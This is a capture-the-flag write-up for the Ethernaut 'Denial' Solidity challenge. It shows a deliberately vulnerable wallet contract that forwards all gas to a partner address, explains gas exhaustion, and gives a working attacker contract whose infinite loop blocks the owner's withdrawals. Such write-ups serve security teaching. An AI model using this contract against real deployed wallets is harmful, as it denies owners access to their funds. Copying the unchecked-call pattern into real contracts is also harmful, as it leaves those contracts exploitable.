---
title: "Denied"
tags: ["Gas Limit Exhaustion"]
reference: https://ethernaut.openzeppelin.com/level/20
---

## Description

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

## Solution

### Attack Idea

1. Each transaction has gas limit to avoid infinite-loop.
2. A function call from one contract to another does not create its own transaction, it is a message call as part of the overall transaction.
3. So `partner.call{value: amountToSend}("");` can write malicious code to consume "all" the gas such that the subsequent of calls of `withdraw` function are out of gas to execute.
    - The caller always retains at least 1/64th of the gas in a call
4. Function calls also cause exceptions if the called contract itself throws an exception or goes out of gas.

Ref: https://docs.soliditylang.org/en/latest/control-structures.html#external-function-calls

### Solidity Code

```sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external; 
}

contract DenyWithdraw {
    address victim;

    function pwn(address _victim) external payable {
        victim = _victim;
        IDenial(victim).setWithdrawPartner(address(this));
        IDenial(victim).withdraw();
    }

    receive() external payable {
        // Consume all gas
        while (true) {}
    }
}
```

## Failed Attempts

1. make `amountToSend` become 0 such that `transfer(0)` is not work because `transfer(0)` is valid.
